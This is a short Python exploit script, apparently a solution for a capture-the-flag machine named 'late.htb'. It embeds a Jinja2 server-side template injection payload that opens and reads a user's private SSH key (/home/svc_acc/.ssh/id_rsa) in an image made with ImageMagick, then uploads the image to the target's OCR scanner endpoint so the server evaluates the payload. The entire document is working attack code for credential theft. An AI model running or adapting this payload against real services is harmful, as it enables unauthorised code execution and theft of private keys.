import requests
import os

URL = "http://images.late.htb"

malcious_txt = """{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}""".replace("'", "\\'").replace('"', '\\"')
convert = f"""convert -font "fira-code" -fill "#ffffffff" -background black -pointsize 72 label:"{malcious_txt}" label.png"""
print(convert)
os.popen(convert).read()
file = open("label.png", "rb")
r = requests.post(URL+"/scanner", files={"file":file})
print(r.text)